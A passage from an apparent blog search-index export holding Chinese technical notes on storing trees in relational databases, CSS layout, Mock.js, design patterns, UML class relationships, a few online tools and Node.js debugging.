    <content type="text"><![CDATA[树形结构很常见，例如组织结构图、线性化讨论等。树形结构中，实例被称为节点（node），每个节点有多个子节点和一个父节点。最上层的节点叫根（root）节点，它没有父节点。最底层的节点叫叶（leaf）节点，它没有子节点。本文主要介绍如何在关系数据库中存储树结构，以及如何从关系数据库中恢复树结构。 关系数据库中存储树结构的方法层级数据设计方案在关系数据库中存储树结构主要有以下几种方案： 邻接表模型 最常见的解决方案，在数据库表中添加parent_id字段，再引用同一张表中的其他记录的id。可通过一个外键约束维护这种关系。 优点：增加叶节点、修改节点或子树位置很方便。 缺点：查询节点的所有后代、删除子树很困难。 路径枚举 路径枚举是一个由连续的直接层级关系组成的完整路径。例如/usr/local/lib。 优点：查询节点所有后代、插入新节点很方便。缺点：依赖应用程序逻辑代码维护路径字符串，验证字符串正确性开销大。受限于字符串长度，树结构无法无限扩展。 嵌套集 嵌套集解决方案是存储子孙节点的相关信息，而不是节点的直接祖先。通常使用两个数字nsleft和nsright编码每个节点，以表示子孙节点信息。 nsleft的数值小于该节点所有后代的ID，同时nsright的值大于该节点所有后代的ID。 确定这三个值（nsleft，ID，nsright）的简单方法是对树进行一次深度优先遍历，在逐层深入过程中依次递增地分配nsleft的值，并在返回时依次递增地分配nsright的值。 优点：查询给定节点祖先和后代很容易，删除非叶子节点，其后代会自动代替被删除节点成为其祖先节点的直接后代。 缺点：不易理解，插入和移动节点复杂。 闭包表 闭包表通过额外的数据库表记录树中节点间父子的关系，包括直接的父子关系、间接的父子关系和指向自己的关系。 层级数据设计比较层级数据设计比较 设计 表 查询子 查询树 插入 删除 引用完整性 邻接表 1 简单 困难 简单 简单 是 邻接表+递归查询 1 简单 简单 简单 简单 否 路径枚举 1 简单 简单 简单 简单 否 嵌套集 1 困难 简单 困难 困难 否 闭包集 2 简单 简单 简单 简单 是 邻接表设计最简单，如果使用的数据库支持WITH或CONNECT BY PRIOR的递归查询，将使得邻接表查询更为高效。 前端从关系数据库中还原树结构表结构，使用sequelize的对象表示：12345678910111213141516171819202122232425262728&apos;use strict&apos;;module.exports = (sequelize, DataTypes) =&gt; &#123; const Role = sequelize.define(&apos;Role&apos;, &#123; id: &#123; type: DataTypes.STRING(50), primaryKey: true &#125;, roleName: &#123; type: DataTypes.STRING(128), allowNull: false &#125;, path: &#123; type: DataTypes.STRING(512), allowNull: false, unique: true, comment: &apos;角色路径唯一！&apos; &#125;, deleteFlag:&#123; type: DataTypes.BOOLEAN, defaultValue: false &#125; &#125;, &#123;&#125;); Role.associate = function(models) &#123; // associations can be defined here Role.hasMany(models.User) &#125;; return Role;&#125;; 递归生成角色树： 12345678910111213141516171819202122232425262728293031323334353637383940// 获取第一层节点function getFirstLevel(recordList)&#123; var firstLevelList=[]; for(let i=0;i&lt; recordList.length;i++)&#123; let record=recordList[i] if (record.path.length === 2 &amp;&amp; record.path.split(&apos;&apos;)[1] === &apos;/&apos; &amp;&amp; parseInt(record.path.split(&apos;&apos;)[0])&gt;=0)&#123; record.label=record.roleName firstLevelList.push(record) &#125; &#125; return firstLevelList&#125;// 指定根节点，递归生成角色树function recursiveTree(parentRecord,recordList)&#123; for (let i = 0; i &lt; recordList.length; i++)&#123; let record = recordList[i] if(parentRecord.path==record.path.slice(0,-2))&#123; record=recursiveTree(record,recordList) if (parentRecord.children==undefined)&#123; parentRecord.children=[] &#125; parentRecord.children.push(record) &#125; &#125; parentRecord.label = parentRecord.roleName return parentRecord&#125;// 生成角色树export function parseRoleTree(recordList)&#123; var result = getFirstLevel(recordList); for (let i=0;i&lt;result.length;i++)&#123; parent = result[i] parent = recursiveTree(parent, recordList) &#125; return result;&#125; 参考链接 java递归生成树形结构菜单,by 伊宇紫. Bill Karwin著,谭振林,Push Chen译. SQL反模式[M].人民邮电出版社.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页布局方法入门]]></title>
    <url>%2F2019%2F08%2F10%2F%E7%BD%91%E9%A1%B5%E5%B8%83%E5%B1%80%E6%96%B9%E6%B3%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[使用CSS对网页布局进行设计是前端工程师的重要工作。下面即介绍各种CSS网页布局的方法，以及相应的技术。 居中方法居中在布局中很常见，假设DOM文档结构如下，子元素要在父元素中居中： 123&lt;div class=&quot;parent&quot;&gt; &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;&lt;/div&gt; 水平居中子元素为行内元素还是块状元素，宽度一定还是宽度未定，采取的布局方案不同。以下即根据子元素的类型给出对应水平居中方法： 行内元素：对父元素设置text-align:center; 定宽块状元素: 设置左右margin值为auto; 不定宽块状元素: 设置子元素为display:inline,然后在父元素上设置text-align:center; 通用方案: flex布局，对父元素设置display:flex;justify-content:center; 垂直居中垂直居中对于子元素是单行内联文本、多行内联文本以及块状元素采用的方案是不同的。具体方法如下： 父元素一定，子元素为单行内联文本：设置父元素的height等于行高line-height 父元素一定，子元素为多行内联文本：设置父元素的display:table-cell或inline-block，再设置vertical-align:middle; 块状元素:设置子元素position:absolute 并设置top、bottom为0，父元素要设置定位为static以外的值，margin:auto; 单列布局单列布局如图1所示，可分成两种类型，有定宽、水平居中的特点。 一种是header、content、footer宽度都相同，其一般不会占满浏览器的最宽宽度，但当浏览器宽度缩小低于其最大宽度时，宽度会自适应。 一种是header、footer宽度为浏览器宽度，但content以及header和footer里的内容却不会占满浏览器宽度。 图1 单列布局的两种形式 对于第一种，对header、content、footer统一设置width或max-width，并通过margin:auto实现居中。 12345&lt;div class=&quot;layout&quot;&gt; &lt;div id=&quot;header&quot;&gt;头部&lt;/div&gt; &lt;div id=&quot;content&quot;&gt;内容&lt;/div&gt; &lt;div id=&quot;footer&quot;&gt;尾部&lt;/div&gt;&lt;/div&gt; 12345.layout&#123; /* width: 960px; *//*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*/ max-width: 960px; margin: 0 auto; &#125; 对于第二种，header、footer的内容宽度为100%，但header、footer的内容区以及content统一设置width 或 max-width，并通过margin:auto实现居中。 1234567&lt;div id=&quot;header&quot;&gt; &lt;div class=&quot;layout&quot;&gt;头部&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;content&quot; class=&quot;layout&quot;&gt;内容&lt;/div&gt;&lt;div id=&quot;footer&quot;&gt; &lt;div class=&quot;layout&quot;&gt;尾部&lt;/div&gt;&lt;/div&gt; 12345.layout&#123; /* width: 960px; *//*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*/ max-width: 960px; margin: 0 auto; &#125; 二列&amp;三列布局二列布局的特征是侧栏固定宽度，主栏自适应宽度。三列布局的特征是两侧两列固定宽度，中间列自适应宽度。 之所以将二列布局和三列布局写在一起，是因为二列布局可以看做去掉一个侧栏的三列布局，其布局的思想有异曲同工之妙。 对于传统的实现方法，主要讨论上图2中前三种布局，经典的带有侧栏的二栏布局以及带有左右侧栏的三栏布局。使用flex技术，可实现图2的五种布局。 图2 二列&三列布局 实现二列&amp;三列布局的CSS技术主要有： float+margin原理说明：设置两个侧栏分别向左向右浮动，中间列通过外边距给两个侧栏腾出空间，中间列的宽度根据浏览器窗口自适应。 12345&lt;div id=&quot;content&quot;&gt; &lt;div class=&quot;sub&quot;&gt;sub&lt;/div&gt; &lt;div class=&quot;extra&quot;&gt;extra&lt;/div&gt; &lt;div class=&quot;main&quot;&gt;main&lt;/div&gt;&lt;/div&gt; 123456789101112.sub&#123; width: 100px; float: left;&#125;.extra&#123; width: 200px; float: right;&#125;.main&#123; margin-left: 100px; margin-right: 200px;&#125; 注意： DOM文档的书写顺序，先写两侧栏，再写主面板，更换后则侧栏会被挤到下一列（圣杯布局和双飞翼布局都会用到）。 这种布局方式比较简单明了，但缺点是渲染时先渲染了侧边栏，而不是比较重要的主面板。 position+margin原理说明：通过绝对定位将两个侧栏固定，同样通过外边距给两个侧栏腾出空间，中间列自适应。 123&lt;div class=&quot;sub&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;main&quot;&gt;main&lt;/div&gt;&lt;div class=&quot;extra&quot;&gt;right&lt;/div&gt; 1234567891011121314.sub, .extra &#123; position: absolute; top: 0; width: 200px;&#125;.sub &#123; left: 0;&#125;.extra &#123; right: 0; &#125;.main &#123; margin: 0 200px;&#125; 注意： 本方法不限制DOM书写顺序，先写主面板会使主面板部分优先渲染（一般主面板会比侧栏内容重要）。 与上一种方法相比，本种方法是通过定位来实现侧栏的位置固定。 如果中间栏含有最小宽度限制，或是含有宽度的内部元素，则浏览器窗口小到一定程度，主面板与侧栏会发生重叠。 圣杯布局(float + 负margin)原理说明： 主面板设置宽度为100%，主面板与两个侧栏都设置浮动，常见为左浮动，这时两个侧栏会被主面板挤下去。通过负边距将浮动的侧栏拉上来，左侧栏的负边距为100%，刚好是窗口的宽度，因此会从主面板下面的左边跑到与主面板对齐的左边，右侧栏此时浮动在主面板下面的左边，设置负边距为负的自身宽度刚好浮动到主面板对齐的右边。为了避免侧栏遮挡主面板内容，在外层设置左右padding值为左右侧栏的宽度，给侧栏腾出空间，此时主面板的宽度减小。由于侧栏的负margin都是相对主面板的，两个侧栏并不会像我们理想中的停靠在左右两边，而是跟着缩小的主面板一起向中间靠拢。此时使用相对布局，调整两个侧栏到相应的位置。 双飞翼布局(float + 负margin )原理说明： 双飞翼布局和圣杯布局的思想有些相似，都利用了浮动和负边距，但双飞翼布局在圣杯布局上做了改进，在main元素上加了一层div, 并设置margin,由于两侧栏的负边距都是相对于main-wrap而言，main的margin值变化便不会影响两个侧栏，因此省掉了对两侧栏设置相对布局的步骤。 flex布局与之前所讲的几种传统布局方案相比，flex布局的代码可谓异常简洁，而且非常通用，利用简单的三行CSS即实现了常见的五种布局。 1234567891011121314151617181920212223&lt;div class=&quot;layout&quot;&gt; &lt;aside class=&quot;aside&quot;&gt;侧边栏宽度固定&lt;/aside&gt; &lt;div class=&quot;main&quot;&gt;主内容栏宽度自适应&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;main&quot;&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=&quot;aside&quot;&gt;侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt;&lt;div class=&quot;layout&quot;&gt; &lt;aside class=&quot;aside&quot;&gt;左侧边栏宽度固定&lt;/aside&gt; &lt;div class=&quot;main&quot;&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=&quot;aside&quot;&gt;右侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt;&lt;div class=&quot;layout&quot;&gt; &lt;aside class=&quot;aside&quot;&gt;第1个侧边栏宽度固定&lt;/aside&gt; &lt;aside class=&quot;aside&quot;&gt;第2个侧边栏宽度固定&lt;/aside&gt; &lt;div class=&quot;main&quot;&gt;主内容栏宽度自适应&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;main&quot;&gt;主内容栏宽度自适应&lt;/div&gt; &lt;aside class=&quot;aside&quot;&gt;第1个侧边栏宽度固定&lt;/aside&gt; &lt;aside class=&quot;aside&quot;&gt;第2个侧边栏宽度固定&lt;/aside&gt;&lt;/div&gt; 123456789.layout &#123; display: flex;&#125;.main &#123; flex: 1;&#125;.aside &#123; width: 200px;&#125; 自适应与响应式布局自适应是为了解决如何才能在不同大小的设备上呈现同样的网页，实现一次设计，普遍适用而提出的技术，以避免维护多个版本的针对不同分辨率设备的网页。 但自适应存在一个问题，如果屏幕太小，即使网页能够根据屏幕大小进行适配，但是会感觉在小屏幕上查看，内容过于拥挤。响应式正是为了解决这个问题而衍生出来的概念。它可以自动识别屏幕宽度、并做出相应调整的网页设计，布局和展示的内容可能会有所变动。 目前网页的响应式布局解决方案成为当前主流，并因 twitter 开源的 bootstrap 而被大家熟知。响应式布局的实现原理如下： 允许网页宽度自动调整 网页代码的头部，加入一行viewport元标签。 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt; viewport是网页默认的宽度和高度，上面这行代码的意思是，网页宽度默认等于屏幕宽度（width=device-width），原始缩放比例（initial-scale=1）为1.0，即网页初始大小占屏幕面积的100%。 尽量少使用绝对宽度 由于网页会根据屏幕宽度调整布局，所以不能使用绝对宽度的布局，也不能使用具有绝对宽度的元素。这一条非常重要。具体说，CSS代码不能指定像素宽度： 1width:xxx px; 通过指定百分比宽度来替代：同时还可以配合css的cal，进行计算宽度。12width: xx%;width:auto; 相对大小的字体 字体也不能使用绝对大小（px），而只能使用相对大小（em）或者高清方案（rem）,rem不局限于字体大小，前面的宽度width也可以使用，代替百分比。 123body &#123; font: normal 100% Helvetica, Arial, sans-serif;&#125; 上面的代码指定，字体大小是页面默认大小的100%，即16像素。 123h1 &#123; font-size: 1.5em; &#125; 然后，h1的大小是默认大小的1.5倍，即24像素（24/16=1.5）。 流动布局（fluid grid） “流动布局”的含义是，各个区块的位置都是浮动的，不是固定不变的。 123456789.main &#123; float: right; width: 70%; &#125;.leftBar &#123; float: left; width: 25%;&#125; float的好处是，如果宽度太小，放不下两个元素，后面的元素会自动滚动到前面元素的下方，不会在水平方向overflow（溢出），避免了水平滚动条的出现。 选择加载CSS “自适应网页设计”的核心，就是CSS3引入的Media Query模块。 它的意思就是，自动探测屏幕宽度，然后加载相应的CSS文件。 1234567&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen and (max-device-width: 400px)&quot; href=&quot;tinyScreen.css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen and (min-width: 400px) and (max-device-width: 600px)&quot; href=&quot;smallScreen.css&quot; /&gt; 除了用html标签加载CSS文件，还可以在现有CSS文件中加载。 1@import url(&quot;tinyScreen.css&quot;) screen and (max-device-width: 400px); CSS的@media规则 同一个CSS文件中，也可以根据不同的屏幕分辨率，选择应用不同的CSS规则。 12345678910@media screen and (max-device-width: 400px) &#123; .column &#123; float: none; width:auto; &#125; #sidebar &#123; display:none; &#125;&#125; 图片的自适应（fluid image） 除了布局和文本，”自适应网页设计”还必须实现图片的自动缩放。这只要一行CSS代码： 1img &#123; max-width: 100%;&#125; 布局相关CSSdisplaydisplay CSS 属性指定了元素的显示类型，它包含两类基础特征，用于指定元素怎样生成盒模型——外部显示类型定义了元素怎样参与流式布局的处理，内部显示类型定义了元素内子元素的布局方式。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* &lt;display-outside&gt; values */display: block;display: inline;display: run-in;/* &lt;display-inside&gt; values */display: flow;display: flow-root;display: table;display: flex;display: grid;display: ruby;/* &lt;display-outside&gt; plus &lt;display-inside&gt; values */display: block flow;display: inline table;display: flex run-in;/* &lt;display-listitem&gt; values */display: list-item;display: list-item block;display: list-item inline;display: list-item flow;display: list-item flow-root;display: list-item block flow;display: list-item block flow-root;display: flow list-item block;/* &lt;display-internal&gt; values */display: table-row-group;display: table-header-group;display: table-footer-group;display: table-row;display: table-cell;display: table-column-group;display: table-column;display: table-caption;display: ruby-base;display: ruby-text;display: ruby-base-container;display: ruby-text-container;/* &lt;display-box&gt; values */display: contents;display: none;/* &lt;display-legacy&gt; values */display: inline-block;display: inline-table;display: inline-flex;display: inline-grid;/* Global values */display: inherit;display: initial;display: unset; positionCSS position属性用于指定一个元素在文档中的定位方式。top，right，bottom 和 left 属性则决定了该元素的最终位置。position 属性被指定为从下面的值列表中选择的单个关键字： static 该关键字指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。此时 top, right, bottom, left 和 z-index 属性无效。 relative 该关键字下，元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。position:relative 对 table-*-group, table-row, table-column, table-cell, table-caption 元素无效。 absolute 不为元素预留空间，通过指定元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。 fixed 不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。fixed 属性会创建新的层叠上下文。当元素祖先的 transform 属性非 none 时，容器由视口改为该祖先。 sticky 盒位置根据正常流计算(这称为正常流动中的位置)，然后相对于该元素在流中的 flow root（BFC）和 containing block（最近的块级祖先元素）定位。在所有情况下（即便被定位元素为 table 时），该元素定位均不对后续元素造成影响。当元素 B 被粘性定位时，后续元素的位置仍按照 B 未定位时的位置来确定。position: sticky 对 table 元素的效果与 position: relative 相同。 floatfloat CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动(文档流)中移除，尽管仍然保持部分的流动性（与绝对定位相反）。float 属性的值被指定为单一的关键字，值从下面的值列表中选择: left 表明元素必须浮动在其所在的块容器左侧的关键字。 right 表明元素必须浮动在其所在的块容器右侧的关键字。 none 表明元素不进行浮动的关键字。 inline-start 关键字，表明元素必须浮动在其所在块容器的开始一侧，在ltr脚本中是左侧，在rtl脚本中是右侧。 inline-end 关键字，表明元素必须浮动在其所在块容器的结束一侧，在ltr脚本中是右侧，在rtl脚本中是左侧。 float属性具有包裹性和高度欺骗两个特性。 包裹性block元素不指定width的话，默认是100%，一旦让该div浮动起来，立刻会像inline元素一样产生包裹性，宽度会跟随内容自适应。（这也是通常float元素需要手动指定width的原因）。 图3 float的包裹性 效果非常近似于display:inline-block。但相比之下，浮动能设定为左浮和右浮，但display:inline-block都是从左到右排列的。（还有些细微差别，两个display:inline-block间会有空隙，但两个float间没有。） 高度欺骗性 图4 float的高度欺骗性 外层div在没有手动设定height的前提下，其高度是由内部content的最大高度决定的，由于img的float使得img具有高度塌陷的欺骗性，让div误以为img的line-height为0，因此div的高度就是文字的匿名inline-box的inline-height。 闭合浮动闭合浮动的实现方法很多，最合理的方法是用:after伪元素，思路是用:after元素在div后面插入一个隐藏文本”.”，隐藏文本用clear来实现闭合浮动。 12345678910.clearfix:after &#123; clear: both; content: &quot;.&quot;; //你头可以改成其他任意文本如“abc” display: block; height: 0; //高度为0且hidden让该文本彻底隐藏 visibility: hidden;&#125;.clearfix &#123; *zoom: 1;&#125; 123456789&lt;div style=&quot;border:4px solid blue;&quot; class=&quot;clearfix&quot;&gt; &lt;div style=&quot;width:200px; border:4px solid red; float:left;&quot;&gt; 我是浮动元素1 &lt;/div&gt; &lt;div style=&quot;width:200px; border:4px solid yellow; float:left;&quot;&gt; 我是浮动元素2 &lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;border:4px solid gray;&quot;&gt;我是页脚&lt;/div&gt; 参考链接 CSS布局十八般武艺都在这里了,by Shelley Lee. Flex 布局教程：语法篇,by 阮一峰. Flex 布局教程：实例篇,by 阮一峰. Flexbox 布局的最简单表单,by 阮一峰. 自适应网页设计（Responsive Web Design）,by 阮一峰. CSS Grid 网格布局教程,by 阮一峰. 响应式和自适应的区别,by LorinLuo. display,by mozilla. position,by mozilla. CSS浮动float详解,by 张歆琳. float,by mozilla. Scrolling a flexbox with overflowing content,by stackoverflow. How to Fix Overflow Issues in CSS Flex Layouts,by moduscreate.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mockjs入门简介]]></title>
    <url>%2F2019%2F08%2F09%2FMockjs%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Mock.js可生成随机数据，拦截Ajax请求，实现前后端分离的目的。Mockjs支持生成随机的文本、数字、布尔值、日期、邮箱、链接、图片、颜色等数据类型，增加了单元测试的真实性，具有用法简单，方便扩展和开发无侵入的特点。下面简单介绍Mockjs的用法。 开始 &amp; 安装Node (CommonJS)12# 安装npm install mockjs 1234567891011// 使用 Mockvar Mock = require(&apos;mockjs&apos;)var data = Mock.mock(&#123; // 属性 list 的值是一个数组，其中含有 1 到 10 个元素 &apos;list|1-10&apos;: [&#123; // 属性 id 是一个自增数，起始值为 1，每次增 1 &apos;id|+1&apos;: 1 &#125;]&#125;)// 输出结果console.log(JSON.stringify(data, null, 4)) 语法规范Mock.js 的语法规范包括两部分： 数据模板定义规范（Data Template Definition，DTD） 数据占位符定义规范（Data Placeholder Definition，DPD） 数据模板定义规范 DTD数据模板中的每个属性由 3 部分构成：属性名、生成规则、属性值： 1234// 属性名 name// 生成规则 rule// 属性值 value&apos;name|rule&apos;: value 注意： 属性名 和 生成规则 之间用竖线 | 分隔。 生成规则 是可选的。 生成规则 有 7 种格式： ‘name|min-max’: value ‘name|count’: value ‘name|min-max.dmin-dmax’: value ‘name|min-max.dcount’: value ‘name|count.dmin-dmax’: value ‘name|count.dcount’: value ‘name|+step’: value 生成规则 的 含义 需要依赖 属性值的类型 才能确定。 属性值 中可以含有 @占位符。 属性值 还指定了最终值的初始值和类型。 数据占位符定义规范 DPD占位符 只是在属性值字符串中占个位置，并不出现在最终的属性值中。 占位符 的格式为： 12@占位符@占位符(参数 [, 参数]) 注意： 用 @ 来标识其后的字符串是 占位符。 占位符 引用的是 Mock.Random 中的方法。 通过 Mock.Random.extend() 来扩展自定义占位符。 占位符 也可以引用 数据模板 中的属性。 占位符 会优先引用 数据模板 中的属性。 占位符 支持 相对路径 和 绝对路径。 Mock.RandomMock.Random 是一个工具类，用于生成各种随机数据。 Mock.Random 的方法在数据模板中称为『占位符』，书写格式为 @占位符(参数 [, 参数]) 。 1234567var Random = Mock.RandomRandom.email()// =&gt; &quot;n.clark@miller.io&quot;Mock.mock(&apos;@email&apos;)// =&gt; &quot;y.lee@lewis.org&quot;Mock.mock( &#123; email: &apos;@email&apos; &#125; )// =&gt; &#123; email: &quot;v.lewis@hall.gov&quot; &#125; 参考链接 Mockjs,by nuysoft. Mockjs语法规范,by nuysoft. Mock.Random,by nuysoft.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件设计模式简介]]></title>
    <url>%2F2019%2F08%2F06%2F%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[软件模式是将模式的一般概念应用于软件开发领域，即软件开发的 总体指导思路或参照样板。软件模式并非仅限于设计模式，还包括 架构模式、分析模式和过程模式等，实际上，在软件生存期的每一个阶段都存在着一些被认同的模式。下面重点介绍各种经典的设计模式。 创建型模式 简单工厂模式( Simple Factory Pattern ) 工厂方法模式(Factory Method Pattern) 抽象工厂模式(Abstract Factory) 建造者模式 单例模式 结构型模式 适配器模式 桥接模式 装饰模式 外观模式 享元模式 代理模式 行为型模式 命令模式 中介者模式 观察者模式 状态模式 策略模式 参考链接 图说设计模式,by me115.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UML类图中类之间关系]]></title>
    <url>%2F2019%2F08%2F06%2FUML%E7%B1%BB%E5%9B%BE%E4%B8%AD%E7%B1%BB%E4%B9%8B%E9%97%B4%E5%85%B3%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[UML类图中类之间的关系主要有六种：泛化、实现、聚合、组合、依赖、关联。如图1所示。 ![UML类图](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_class_struct.jpg "UML类图") 车的类图结构为&lt;&gt;，表示车是一个抽象类； 它有两个继承类：小汽车和自行车；它们之间的关系为实现关系，使用带空心箭头的虚线表示； 小汽车为与SUV之间也是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示； 小汽车与发动机之间是组合关系，使用带实心箭头的实线表示； 学生与班级之间是聚合关系，使用带空心箭头的实线表示； 学生与身份证之间为关联关系，使用一根实线表示； 学生上学需要用到自行车，与自行车是一种依赖关系，使用带箭头的虚线表示； 熟悉这六种关系及其符号表示，有利于我们设计类图和同行之间交流。下面介绍这六种关系。 泛化关系(generalization)类的继承结构表现在UML中为：泛化(generalize)与实现(realize)： 继承关系为 is-a的关系；两个对象之间如果可以用 is-a 来表示，就是继承关系：（..是..) 例如：自行车是车、猫是动物。 泛化关系用一条带空心箭头的直接表示；如下图表示； ![泛化关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_generalize.jpg) 汽车在现实中有实现，可用汽车定义具体的对象；汽车与SUV之间为泛化关系；最终代码中，泛化关系表现为继承非抽象类； 实现关系(realize)实现关系用一条带空心箭头的虚线表示； 例如：”车”为一个抽象概念，在现实中并无法直接用来定义对象；只有指明具体的子类(汽车还是自行车)，才可以用来定义对象（”车”这个类在C++中用抽象类表示，在JAVA中有接口这个概念，更容易理解） ![实现关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_realize.jpg) 最终代码中，实现关系表现为继承抽象类； 聚合关系(aggregation)聚合关系用一条带空心菱形箭头的直线表示，如下图表示A聚合到B上，或者说B由A组成； ![聚合关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_aggregation.jpg) 聚合关系用于表示实体对象之间的关系，表示整体由部分构成的语义；例如一个部门由多个员工组成； 与组合关系不同的是，整体和部分不是强依赖的，即使整体不存在了，部分仍然存在；例如， 部门撤销了，人员不会消失，他们依然存在； 组合关系(composition)组合关系用一条带实心菱形箭头直线表示，如下图表示A组成B，或者B由A组成； ![组合关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_composition.jpg) 与聚合关系一样，组合关系同样表示整体由部分构成的语义；比如公司由多个部门组成； 但组合关系是一种强依赖的特殊聚合关系，如果整体不存在了，则部分也不存在了；例如， 公司不存在了，部门也将不存在了； 关联关系(association)关联关系是用一条直线表示的；它描述不同类的对象之间的结构关系；它是一种静态关系， 通常与运行状态无关，一般由常识等因素决定的；它一般用来定义对象之间静态的、天然的结构； 所以，关联关系是一种“强关联”的关系； 比如，乘车人和车票之间就是一种关联关系；学生和学校就是一种关联关系； 关联关系默认不强调方向，表示对象间相互知道；如果特别强调方向，如下图，表示A知道B，但 B不知道A； ![关联关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_association.jpg) 在最终代码中，关联对象通常是以成员变量的形式实现的； 依赖关系(dependency)依赖关系是用一套带箭头的虚线表示的；如下图表示A依赖于B；他描述一个对象在运行期间会用到另一个对象的关系； ![依赖关系](https://design-patterns.readthedocs.io/zh_CN/latest/_images/uml_dependency.jpg) 与关联关系不同的是，它是一种临时性的关系，通常在运行期间产生，并且随着运行时的变化； 依赖关系也可能发生变化； 显然，依赖也有方向，双向依赖是一种非常糟糕的结构，我们总是应该保持单向依赖，杜绝双向依赖的产生； 在最终代码中，依赖关系体现为类构造方法及类方法的传入参数，箭头的指向为调用关系；依赖关系除了临时知道对方外，还是“使用”对方的方法和属性； 参考链接 看懂UML类图和时序图,by me115.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提高效率的在线工具]]></title>
    <url>%2F2019%2F08%2F06%2F%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[在此记录一些常用在线工具，提高工作效率。 百度文库在线下载在某个文档页面的网址域名后面加上 vvv 三个字母，访问后就可以快捷下载。 比如： https://wenku.baidu.com/view/3e6d30b2fd0a79563c1e72bd.html 加上 vvv 为： https://wenku.baiduvvv.com/view/3e6d30b2fd0a79563c1e72bd.html 商品历史价格查询在电商网站商品详情页的网址域名后面加入vvv三个字母访问后即可查询该商品的历史价格。 例如： https://detail.tmall.com/item.htm?id=527080261251 添加vvv后变为： https://detail.tmallvvv.com/item.htm?id=527080261251 参考链接 VVV文档在线导出工具,by vvv. 商品历史价格查询,by hisprice.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs调试入门]]></title>
    <url>%2F2019%2F07%2F31%2FNodejs%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[调试是每个程序员必备的技能，因此选择合适的调试工具能极大地方便我们调试代码。Node.js 的调试方式也有很多，常见的有： 万能的 console.log debugger node —inspect + chrome devtools 本文重点介绍最有用的node —inspect方法。具体步骤如下： node —inspect app.js 打开 Chrome 浏览器，访问 chrome://inspect，选择第一步的调试目标。 在chrome访问源代码，设置断点调试。 参考链接 《Node.js 调试指南》,by nswbmw.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mock数据]]></title>
    <url>%2F2019%2F07%2F28%2FMock%E6%95%B0%E6%8D%AE%2F</url>
